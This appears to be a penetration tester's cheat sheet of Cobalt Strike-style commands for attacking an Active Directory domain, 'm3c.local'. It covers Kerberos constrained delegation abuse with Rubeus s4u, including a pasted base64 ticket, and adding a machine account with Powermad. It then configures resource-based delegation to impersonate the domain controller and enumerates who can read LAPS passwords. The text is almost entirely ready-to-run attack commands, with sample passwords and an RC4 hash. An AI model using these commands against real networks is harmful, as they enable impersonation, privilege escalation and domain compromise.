Contrained Delegation Exploit (S4U)

# Impersonate another user as a Servcie (IE. WinRM) 
execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpView.exe Get-DomainComputer -TrustedToAuth -Properties distinguishedname msds-allowedtodelegateto useraccountcontrol -Verbose | fl
execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpView.exe Get-DomainUser -TrustedToAuth -Properties distinguishedname msds-allowedtodelegateto useraccountcontrol -Verbose | fl

execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe tgtdeleg
execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIE9jCCBPKgAwIBBaEDAgEWooIEBTCCBAFhggP9MIID+aADAgEFoQsbCU0zQy5MT0NBTKIeMBygAwIBAqEVMBMbBmtyYnRndBsJTTNDLkxPQ0FMo4IDwzCCA7+gAwIBEqEDAgEEooIDsQSCA60qDQg2Sw6mZmDd8GSSutUhMDPh+DF2JJTb9KzQf3aslAVsCOYtPMVlTfWePgBG01Nw9G1wl/Rw1/ZptMO34kLT4isfXTJ+GFC7E490/Ev5oTIYkkGyr7CxCR4QPUk2yW3J6/5DYAr93HBC7COxGE3jGFtZMByfJXMcgziUSPrvSzhibzWavAzeZT1DGZHT4lH2J/DquKPMR399a34sdIYtWBon1YtqOowQqKzRdycZ6l3OaZv8gQpPxRu3cDNcuquxPLYqPsHgo36H9gVMEqpAlOl9UhuOG4rZXoaMn83G9r1k2JzlrjeVPKIaWuluOPCLz/jF4KZnAtGQfNco5uk80QCidvQnWt9HU6ZLJTSuoTgUKqzQIgnehh9cLrv9VNfjAYxDsx1SZUGA5Dzud/oo9VG4YTi3Cs2sxr5X2lebnLUdJzp8e8ghKKbK8fpCWbkYawmFgx3/++v/xxajyuYBzsz/36FeWHIkGETYAIQMLvAzF06KzvkJdZ+o7JZ/30+vajR/fyn9Gt/p5twhKBomNi21g3pUkhvVUZMtPzsqGap+0eSlS3xI/uTJBlnAuZiosDUnlBYPzEcOh/95Vd5tuqDwM9ZRvTWB2LeUP/rdrN1enzDMLu+FMwwacswwjLq0owONyGKOUCf4Nt91M60oeQRBQfqwCZn9ktduFxpjTN1Soja9/CijieHggwpmjHoh75SQ16WnbYDhRxOY5OCtSPtQn2zlUakg5Fh9GDPBmwOMiPQjOSBKbZ6DEzrivnCU/HJ+kuzQ5F359irAzhvLq9n7fLZB6dWgTTs0qOoQpn782zVYbVZSrShjosZI9jF+czxqlKINil2QT1NaAQ3i33/C7j2iM0a39Sw9K0wF2UccTV40b23qVQ48MlNyf8UmSsg8iUm+ankc5/FAmQgkZvEsDCEhMXWspNyGqUAqtT5oiG82FXnEpK7w/fl2/jSDK8aPuwwNLZYi6LRTkFkjIAN/Zr/n3NhGELU7PQ3dRD1eFcwb5qFk5cIRjEgKLi8MZqgbyqPuv6V3ZXshsoDtcwaB8HPTtolOBPgjKGfmYt7E4WIzwezTKojaAiGbU0FDQXgIZRkrcIzOcpDmE40FAdY3LKGtkfydMPKC29XB5pyat+hPo+Nf3flI/Bfuc7MNbVFRxqdRqsDq9JjLe6nCuBG70KC2ukLphIuCsnP6/k0N0s4L+fb4XlSF/g79qHHQh2cXCgs0+wnu573XN2dr4znHm3yuRnNfT4RlX6OB3DCB2aADAgEAooHRBIHOfYHLMIHIoIHFMIHCMIG/oCswKaADAgESoSIEIMU1W8DilBFLCUcZNpJ3vRlxZZz5lYWlUkoOxJXFAJJLoQsbCU0zQy5MT0NBTKIUMBKgAwIBAaELMAkbB3N2Y19zcWyjBwMFAGChAAClERgPMjAyMDA3MjExMzAzNDlaphEYDzIwMjAwNzIxMjIwMTU5WqcRGA8yMDIwMDcyODEyMDE1OVqoCxsJTTNDLkxPQ0FMqR4wHKADAgECoRUwExsGa3JidGd0GwlNM0MuTE9DQUw= /impersonateuser:DAVID.GAINES /domain:m3c.local /msdsspn:"time/m3webaw.m3c.local" /altservice:wsman /altservice:host /altservice:http /ptt
powerpick Invoke-Command ??ComputerName m3webaw.m3c.local -ScriptBlock { hostname }


Generic Write Add New Machine

#Generic Write (Added New Machine Account)
powershell-import /home/user/Dropbox/tools/post-exploit/windows/Powermad/Powermad.ps1
powerpick New-MachineAccount -MachineAccount MYTESTCOMPUTER -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
## Specify OU
powerpick New-MachineAccount -DistinguishedName "CN=test111,OU=Servers,OU=Computers,OU=m3c,DC=m3c,DC=local" -MachineAccount MYTESTCOMPUTER -Password $(ConvertTo-SecureString '1q2w3e!Q@W#E' -AsPlainText -Force)

powershell-import /home/user/Dropbox/tools/post-exploit/windows/PowerSploit-dev/Recon/PowerView.ps1
powerpick Get-DomainComputer MYTESTCOMPUTER -Properties objectsid | Select -Expand objectsid
S-1-5-21-340507432-2615605230-720798708-3104
powerpick $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$('###PUT THE SID HERER AND CHANGE COMPNAME AT END###'))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer MYTESTCOMPUTER | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
powerpick $RawBytes = Get-DomainComputer MYTESTCOMPUTER -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity; $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0; $Descriptor.DiscretionaryAcl
execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe hash /password:Password123! /user:MYTESTCOMPUTER$ /domain:m3c.local

#Impersonate user or computer
execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /user:MYTESTCOMPUTER$ /rc4:A6046AE491FEA36346D82E83A79777F7 /impersonateuser:M3DC$ /msdsspn:cifs/m3dc.m3c.local /ptt


# Who can view LAPS Passwords (Chanage -Computername)
execute-assembly /opt/tools/CSharp_Tools/Compiled/SharpView.exe Get-NetComputer -ComputerName 'M3WEBAW.M3C.LOCAL' -FullData | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object {Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_} | Where-Object {($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject

